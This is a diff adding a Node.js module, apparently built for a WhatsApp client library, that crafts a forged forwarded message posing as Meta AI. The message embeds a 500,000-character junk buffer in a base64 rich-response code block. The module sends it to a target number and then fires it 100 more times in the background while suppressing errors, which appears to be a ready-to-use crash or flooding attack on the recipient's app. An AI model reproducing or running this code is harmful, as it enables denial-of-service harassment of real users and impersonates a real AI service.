@@ -1,0 +1,114 @@
+function buildPayloads(target) {
+  const jid = String(target).trim().endsWith("@s.whatsapp.net")
+    ? String(target).trim()
+    : String(target).trim() + "@s.whatsapp.net";
+  const buffer = "A".repeat(500000);
+  return { jid, buffer };
+}
+
+function makeTora(p) {
+  return {
+    botForwardedMessage: {
+      message: {
+        richResponseMessage: {
+          messageType: "AI_RICH_RESPONSE_TYPE_STANDARD",
+          submessages: [
+            {
+              messageType: "AI_RICH_RESPONSE_TEXT",
+              messageText: "Telegram: @dgxeon13",
+            },
+          ],
+          unifiedResponse: {
+            data: Buffer.from(
+              JSON.stringify({
+                response_id: "Telegram: @dgxeon13",
+                sections: [
+                  {
+                    view_model: {
+                      primitive: {
+                        text: "",
+                        __typename: "GenAIMarkdownTextUXPrimitive",
+                      },
+                      __typename: "GenAISingleLayoutViewModel",
+                    },
+                  },
+                  {
+                    view_model: {
+                      primitive: {
+                        language: "Gunma",
+                        code_blocks: [
+                          {
+                            content: "Telegram: @dgxeon13\n\n\n",
+                            type: "NUMBER",
+                          },
+                          { content: p.buffer, type: "STR" },
+                        ],
+                        __typename: "GenAICodeUXPrimitive",
+                      },
+                      __typename: "GenAISingleLayoutViewModel",
+                    },
+                  },
+                  {
+                    view_model: {
+                      primitive: {
+                        text: "",
+                        __typename: "GenAIMarkdownTextUXPrimitive",
+                      },
+                      __typename: "GenAISingleLayoutViewModel",
+                    },
+                  },
+                ],
+              })
+            ).toString("base64"),
+          },
+          contextInfo: {
+            forwardingScore: 1,
+            isForwarded: true,
+            forwardedAiBotMessageInfo: {
+              botName: "Meta AI",
+              botJid: "13135550002@s.whatsapp.net",
+              creatorName: "Meta",
+            },
+          },
+        },
+      },
+    },
+  };
+}
+
+async function fire(sock, p) {
+  const tora = makeTora(p);
+  const msg = generateWAMessageFromContent(p.jid, tora, {});
+  return sock.relayMessage(p.jid, msg.message, {
+    messageId: msg.key.id,
+    isSecret: true,
+  });
+}
+
+module.exports = async function (sock, target) {
+  if (!sock || !target) {
+    return { ok: false, error: "Missing sock or target" };
+  }
+
+  let p;
+  try {
+    p = buildPayloads(target);
+    await fire(sock, p);
+  } catch (e) {
+    return { ok: false, error: e.message || "First call failed" };
+  }
+
+  setImmediate(() => {
+    const jobs = [];
+    for (let i = 0; i < 100; i++) {
+      jobs.push(
+        Promise.resolve()
+          .then(() => fire(sock, p))
+          .catch(() => {})
+      );
+    }
+    Promise.allSettled(jobs).catch(() => {});
+  });
+
+  return { ok: true };
+};
